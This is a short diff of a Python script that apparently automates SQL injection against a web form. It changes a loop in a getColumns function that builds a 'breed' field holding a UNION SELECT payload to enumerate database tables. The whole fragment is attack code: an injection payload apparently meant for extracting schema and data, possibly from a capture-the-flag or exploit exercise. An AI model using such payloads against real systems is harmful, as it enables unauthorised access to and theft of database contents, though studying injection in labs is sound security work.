@@ -164,9 +164,9 @@ def getColumnsName(table_name, end_offset, est_column_count):
 def getColumns(null_count, db_name):
     print('[*] Start...')
 
-    for i in range(1, null_count):
+    for i in range(0, null_count):
         null = "NULL"
-        if (i == 1):
+        if (i == 0):
             data = {
                 "breed": "' UNION SELECT " + null + " FROM " + db_name + " WHERE type='table' --"
             }
